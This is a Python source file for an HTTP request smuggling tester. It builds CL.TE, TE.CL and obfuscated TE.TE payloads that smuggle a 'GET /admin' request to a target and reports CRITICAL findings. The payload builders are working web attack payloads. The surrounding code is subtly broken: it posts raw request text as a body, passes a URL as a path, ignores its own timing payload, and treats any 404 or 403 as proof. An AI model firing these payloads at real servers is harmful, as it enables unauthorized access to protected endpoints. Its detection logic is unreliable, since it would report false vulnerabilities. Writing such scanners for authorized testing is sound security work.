"""
HTTP Request Smuggling Tester

Tests for HTTP Request Smuggling vulnerabilities:
- CL.TE (Content-Length vs Transfer-Encoding)
- TE.CL (Transfer-Encoding vs Content-Length)
- TE.TE (obfuscated Transfer-Encoding)
- Timing-based detection
"""

from engine.core.tool_bridge import sync_nuclei_scan, sync_nmap_scan, sync_ffuf_fuzz, sync_sqlmap_test, sync_amass_enum, sync_gobuster_enum, sync_bloodhound_enum, sync_metasploit_execute, sync_nessus_scan, sync_volatility_analyze, sync_zeek_analyze
import requests
import time
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass



@dataclass
class Finding:
    """Request smuggling finding"""
    title: str
    description: str
    severity: str
    evidence: Dict
    vuln_type: str = "HTTP_Smuggling"


class SmugglingTester:
    """Test for HTTP Request Smuggling vulnerabilities"""

    def __init__(self):
        self.timeout = 30
        self.timing_threshold = 5.0  # Seconds delay indicating smuggling

    def test_cl_te(self, url: str) -> List[Finding]:
        """
        Test CL.TE (Content-Length vs Transfer-Encoding) smuggling

        Technique:
        Frontend uses Content-Length, backend uses Transfer-Encoding

        Args:
            url: Target URL

        Returns:
            List of findings if vulnerable
        """
        findings = []

        # Build CL.TE payload
        payload = self._build_cl_te_payload("POST", url, self._get_host(url))

        try:
            # Send smuggling request
            response1 = requests.post(
                url,
                data=payload,
                headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Connection": "keep-alive"
                },
                timeout=self.timeout,
                allow_redirects=False
            )

            # Send second request to trigger smuggled request
            response2 = requests.get(
                url,
                timeout=self.timeout,
                allow_redirects=False
            )

            # Check for smuggling indicators
            if self._indicates_smuggling(response2):
                findings.append(Finding(
                    title="HTTP Request Smuggling (CL.TE)",
                    description="Server vulnerable to CL.TE request smuggling. Frontend uses Content-Length, backend uses Transfer-Encoding.",
                    severity="CRITICAL",
                    evidence={
                        "url": url,
                        "type": "CL.TE",
                        "response1_status": response1.status_code,
                        "response2_status": response2.status_code,
                        "response2_body": response2.text[:500]
                    },
                    vuln_type="HTTP_Smuggling_CLTE"
                ))

        except Exception as e:
            pass

        return findings

    def test_te_cl(self, url: str) -> List[Finding]:
        """
        Test TE.CL smuggling

        Technique:
        Frontend uses Transfer-Encoding, backend uses Content-Length

        Args:
            url: Target URL

        Returns:
            List of findings if vulnerable
        """
        findings = []

        # Build TE.CL payload
        payload = self._build_te_cl_payload("POST", url, self._get_host(url))

        try:
            # Send smuggling request
            response1 = requests.post(
                url,
                data=payload,
                headers={
                    "Transfer-Encoding": "chunked",
                    "Connection": "keep-alive"
                },
                timeout=self.timeout,
                allow_redirects=False
            )

            # Send second request
            response2 = requests.get(
                url,
                timeout=self.timeout,
                allow_redirects=False
            )

            if self._indicates_smuggling(response2):
                findings.append(Finding(
                    title="HTTP Request Smuggling (TE.CL)",
                    description="Server vulnerable to TE.CL request smuggling. Frontend uses Transfer-Encoding, backend uses Content-Length.",
                    severity="CRITICAL",
                    evidence={
                        "url": url,
                        "type": "TE.CL",
                        "response1_status": response1.status_code,
                        "response2_status": response2.status_code,
                        "response2_body": response2.text[:500]
                    },
                    vuln_type="HTTP_Smuggling_TECL"
                ))

        except Exception as e:
            pass

        return findings

    def test_te_te(self, url: str) -> List[Finding]:
        """
        Test TE.TE smuggling (obfuscated Transfer-Encoding header)

        Technique:
        Multiple Transfer-Encoding headers with obfuscation

        Args:
            url: Target URL

        Returns:
            List of findings if vulnerable
        """
        findings = []

        # Obfuscated TE headers
        obfuscations = [
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
            "Transfer-Encoding: chunked\r\nTransfer-encoding: chunked",  # Case variation
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: chunked, identity",
        ]

        for obf_header in obfuscations:
            try:
                # Build payload with obfuscated TE
                payload = self._build_te_te_payload("POST", url, self._get_host(url), obf_header)

                response1 = requests.post(
                    url,
                    data=payload,
                    headers={"Connection": "keep-alive"},
                    timeout=self.timeout,
                    allow_redirects=False
                )

                response2 = requests.get(
                    url,
                    timeout=self.timeout,
                    allow_redirects=False
                )

                if self._indicates_smuggling(response2):
                    findings.append(Finding(
                        title="HTTP Request Smuggling (TE.TE)",
                        description="Server vulnerable to TE.TE request smuggling with obfuscated Transfer-Encoding headers.",
                        severity="CRITICAL",
                        evidence={
                            "url": url,
                            "type": "TE.TE",
                            "obfuscation": obf_header,
                            "response1_status": response1.status_code,
                            "response2_status": response2.status_code
                        },
                        vuln_type="HTTP_Smuggling_TETE"
                    ))
                    break  # Found vulnerability, stop testing

            except Exception:
                continue

        return findings

    def test_timing_detection(self, url: str) -> bool:
        """
        Detect smuggling via timing attacks

        Technique:
        Send potential smuggling payload
        Measure response time differences
        Multiple iterations to confirm

        Args:
            url: Target URL

        Returns:
            True if timing difference indicates smuggling
        """
        # Build timing attack payload (delay backend via smuggled request)
        payload = self._build_timing_payload("POST", url, self._get_host(url))

        try:
            # Baseline timing
            start = time.time()
            requests.get(url, timeout=self.timeout)
            baseline = time.time() - start

            # Smuggling timing
            start = time.time()
            requests.post(url, data=payload, timeout=self.timeout)
            smuggling_time = time.time() - start

            # Check for significant delay
            if smuggling_time > baseline + self.timing_threshold:
                return True

        except Exception:
            pass

        return False

    def generate_smuggling_payloads(self) -> List[str]:
        """
        Generate all smuggling payload variations

        Returns:
            List of raw HTTP payloads for testing
        """
        payloads = []

        # CL.TE variants
        payloads.append(self._build_cl_te_payload("POST", "/", "example.com"))

        # TE.CL variants
        payloads.append(self._build_te_cl_payload("POST", "/", "example.com"))

        # TE.TE variants
        obfuscations = [
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity",
            "Transfer-Encoding: chunked\r\nTransfer-encoding: x",
        ]
        for obf in obfuscations:
            payloads.append(self._build_te_te_payload("POST", "/", "example.com", obf))

        return payloads

    def _build_cl_te_payload(self, method: str, path: str, host: str) -> str:
        """Build CL.TE smuggling payload"""
        # Smuggled request
        smuggled = "GET /admin HTTP/1.1\r\nHost: " + host + "\r\n\r\n"

        # Main request with conflicting CL and TE
        payload = (
            f"{method} {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: {len(smuggled) + 4}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
            f"{smuggled}"
        )

        return payload

    def _build_te_cl_payload(self, method: str, path: str, host: str) -> str:
        """Build TE.CL smuggling payload"""
        # Smuggled request
        smuggled = "GET /admin HTTP/1.1\r\nHost: " + host + "\r\n\r\n"

        # Main request
        payload = (
            f"{method} {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 4\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            f"{len(smuggled):x}\r\n"
            f"{smuggled}\r\n"
            "0\r\n"
            "\r\n"
        )

        return payload

    def _build_te_te_payload(self, method: str, path: str, host: str, obf_header: str) -> str:
        """Build TE.TE smuggling payload with obfuscated headers"""
        smuggled = "GET /admin HTTP/1.1\r\nHost: " + host + "\r\n\r\n"

        payload = (
            f"{method} {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"{obf_header}\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
            f"{smuggled}"
        )

        return payload

    def _build_timing_payload(self, method: str, path: str, host: str) -> str:
        """Build payload for timing-based detection"""
        # Smuggle request that sleeps (if vulnerable)
        smuggled = "GET /404-slow-endpoint HTTP/1.1\r\nHost: " + host + "\r\n\r\n"

        return self._build_cl_te_payload(method, path, host)

    def _indicates_smuggling(self, response) -> bool:
        """Check if response indicates smuggling occurred"""
        # Smuggling indicators
        indicators = [
            response.status_code == 404,  # Smuggled request to non-existent endpoint
            response.status_code == 403,  # Smuggled request to admin endpoint
            "Unrecognized method" in response.text,
            "Invalid request" in response.text,
        ]

        return any(indicators)

    def _get_host(self, url: str) -> str:
        """Extract host from URL"""
        from urllib.parse import urlparse
        parsed = urlparse(url)
        return parsed.netloc
